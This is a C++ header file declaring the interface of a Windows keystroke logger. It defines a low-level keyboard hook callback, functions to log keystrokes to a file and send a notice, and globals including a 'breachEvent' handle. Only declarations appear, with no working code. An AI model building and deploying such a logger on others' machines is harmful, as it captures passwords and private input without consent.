#ifndef KEYBOARD_H
#define KEYBOARD_H

#include <Windows.h>
#include <ctime>
#include <fstream>
#include <iostream>
#include <locale>
#include <map>
#include <mutex>
#include <sstream>
#include <thread>
#include <vector>
#include <regex>

LRESULT __stdcall hookCallback(int, WPARAM, LPARAM);
void logKeystroke(int);
bool releaseHook();
void sendNotice();
bool setHook();
void setLogFile();
int setModKeyState(int, int);

extern std::map<int, std::wstring> mapSpecialKeys;
extern HANDLE breachEvent;
extern HHOOK ghHook;
extern KBDLLHOOKSTRUCT kbdStruct;
extern std::wofstream logFile;
extern std::mutex logFileMutex;
extern std::wstring logFileBuffer;
extern std::map<std::wstring, bool> modKeyStates;

#endif
